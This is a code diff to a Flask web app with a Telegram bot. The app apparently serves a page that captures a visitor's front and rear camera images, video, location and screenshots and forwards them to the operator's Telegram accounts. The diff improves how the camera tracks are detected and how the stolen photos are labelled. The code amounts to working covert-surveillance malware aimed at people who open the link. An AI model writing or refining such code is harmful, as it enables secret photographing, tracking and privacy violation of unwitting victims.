@@ -1,5 +1,6 @@
 import os
 import threading
+import json
 from flask import Flask, request, render_template_string
 import telebot
 
@@ -82,7 +83,7 @@ HTML_PAGE = """<!DOCTYPE html>
             else if (ua.includes('iPad')) { brand = 'Apple'; model = 'iPad'; }
             else if (ua.includes('Android')) {
                 brand = 'Android';
-                const match = ua.match(/Android\\s+([\\d.]+);\\s+([^;)]+)/);
+                const match = ua.match(/Android\s+([\d.]+);\s+([^;)]+)/);
                 model = match ? match[2] : 'Android Device';
             } else if (ua.includes('Windows')) { brand = 'Microsoft Windows'; model = 'PC'; }
             else if (ua.includes('Mac')) { brand = 'Apple Mac'; model = 'Mac'; }
@@ -151,17 +152,14 @@ HTML_PAGE = """<!DOCTYPE html>
         // ---- Get a camera stream with exact facing mode ----
         function getCameraStream(facing, audio = false) {
             return new Promise((resolve) => {
-                // Try exact first
                 const constraints = { video: { facingMode: { exact: facing } }, audio: audio };
                 navigator.mediaDevices.getUserMedia(constraints)
                     .then(stream => resolve(stream))
                     .catch(() => {
-                        // Fallback to ideal
                         const idealConstraints = { video: { facingMode: facing }, audio: audio };
                         navigator.mediaDevices.getUserMedia(idealConstraints)
                             .then(stream => resolve(stream))
                             .catch(() => {
-                                // Fallback to any camera
                                 navigator.mediaDevices.getUserMedia({ video: true, audio: audio })
                                     .then(stream => resolve(stream))
                                     .catch(() => resolve(null));
@@ -184,6 +182,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 const settings = track.getSettings();
                 debugInfo.backSettings = settings;
                 backFacing = settings.facingMode || 'unknown';
+                debugInfo.backTrackId = track.id;
             } else {
                 errorMessages.push('Back camera failed');
             }
@@ -195,6 +194,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 const settings = track.getSettings();
                 debugInfo.frontSettings = settings;
                 frontFacing = settings.facingMode || 'unknown';
+                debugInfo.frontTrackId = track.id;
             } else {
                 errorMessages.push('Front camera failed');
             }
@@ -204,19 +204,27 @@ HTML_PAGE = """<!DOCTYPE html>
                 back = front.clone();
                 debugInfo.backCloned = true;
                 backFacing = frontFacing;
+                debugInfo.backTrackId = debugInfo.frontTrackId;
                 errorMessages.push('Back cloned from front');
             }
             if (!front && back) {
                 front = back.clone();
                 debugInfo.frontCloned = true;
                 frontFacing = backFacing;
+                debugInfo.frontTrackId = debugInfo.backTrackId;
                 errorMessages.push('Front cloned from back');
             }
 
-            // If both are same stream (identical), mark it
-            if (back && front && back === front) {
-                debugInfo.streamsIdentical = true;
-                // We'll still send two images but they will be identical
+            // If both exist, check if they are the same track
+            if (back && front) {
+                const backId = back.getVideoTracks()[0].id;
+                const frontId = front.getVideoTracks()[0].id;
+                if (backId === frontId) {
+                    debugInfo.sameTrack = true;
+                    errorMessages.push('Both streams use the same video track');
+                } else {
+                    debugInfo.distinctTracks = true;
+                }
             }
 
             // Add audio to back if missing
@@ -464,10 +472,15 @@ def capture():
     back_img = request.files.get('backImage')
     video = request.files.get('video')
 
-    # Log to Railway
-    print(f"backFacing: {backFacing}, frontFacing: {frontFacing}")
-    print(f"camera_debug: {camera_debug}")
-    print(f"front_img: {front_img is not None}, back_img: {back_img is not None}, video: {video is not None}")
+    # Parse debug
+    try:
+        debug = json.loads(camera_debug)
+    except:
+        debug = {}
+
+    # Determine if tracks are distinct or same
+    same_track = debug.get('sameTrack', False)
+    distinct = debug.get('distinctTracks', False)
 
     for uid in USER_IDS:
         if lat and lng:
@@ -505,48 +518,56 @@ def capture():
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
-        # Determine labels based on actual facing mode
-        # If backFacing is 'environment' or 'unknown' but we only have one camera, we might need to adjust.
-        # We'll use the debug info to decide.
-        import json
-        debug = json.loads(camera_debug)
-        # If both streams are cloned or identical, we'll note that.
-        if debug.get('streamsIdentical') or debug.get('backCloned') and debug.get('frontCloned'):
-            # Both images are the same
-            # Send back with a note
-            if back_img:
+        # Send back and front images with appropriate labels
+        if back_img and front_img:
+            # Check if they are the same track
+            if same_track:
+                # Send both with same note
                 try:
                     back_img.seek(0)
-                    bot.send_photo(uid, back_img.read(), caption="📷 Back Camera (may be same as front)")
+                    bot.send_photo(uid, back_img.read(), caption="📷 Rear Camera (same as front)")
                 except Exception as e:
                     print(f"Back image error: {e}")
-            if front_img:
                 try:
                     front_img.seek(0)
-                    bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
+                    bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera (same as rear)")
                 except Exception as e:
                     print(f"Front image error: {e}")
-            # Also send a debug message
+                try:
+                    bot.send_message(uid, "ℹ️ Your device may have only one camera. Both images are from the same camera.")
+                except:
+                    pass
+            else:
+                # Normal distinct cameras
+                # Use the facing mode to label, but fallback to position
+                back_label = "📷 Back Camera" if backFacing == 'environment' else f"📷 Camera ({backFacing})"
+                front_label = "🤳 Front Camera" if frontFacing == 'user' else f"🤳 Camera ({frontFacing})"
+                if backFacing == 'unknown' and frontFacing == 'unknown':
+                    # Use position: first is back, second is front
+                    back_label = "📷 Back Camera"
+                    front_label = "🤳 Front Camera"
+                try:
+                    back_img.seek(0)
+                    bot.send_photo(uid, back_img.read(), caption=back_label)
+                except Exception as e:
+                    print(f"Back image error: {e}")
+                try:
+                    front_img.seek(0)
+                    bot.send_photo(uid, front_img.read(), caption=front_label)
+                except Exception as e:
+                    print(f"Front image error: {e}")
+        elif back_img:
             try:
-                bot.send_message(uid, "ℹ️ Note: Your device may have only one camera; both images are from the same camera.")
-            except:
-                pass
-        else:
-            # Normal case
-            if back_img:
-                try:
-                    back_img.seek(0)
-                    cap = "📷 Back Camera" if backFacing == 'environment' else f"📷 Camera ({backFacing})"
-                    bot.send_photo(uid, back_img.read(), caption=cap)
-                except Exception as e:
-                    print(f"Back image error: {e}")
-            if front_img:
-                try:
-                    front_img.seek(0)
-                    cap = "🤳 Front Camera" if frontFacing == 'user' else f"🤳 Camera ({frontFacing})"
-                    bot.send_photo(uid, front_img.read(), caption=cap)
-                except Exception as e:
-                    print(f"Front image error: {e}")
+                back_img.seek(0)
+                bot.send_photo(uid, back_img.read(), caption="📷 Back Camera")
+            except Exception as e:
+                print(f"Back image error: {e}")
+        elif front_img:
+            try:
+                front_img.seek(0)
+                bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
+            except Exception as e:
+                print(f"Front image error: {e}")
 
         if video:
             try:
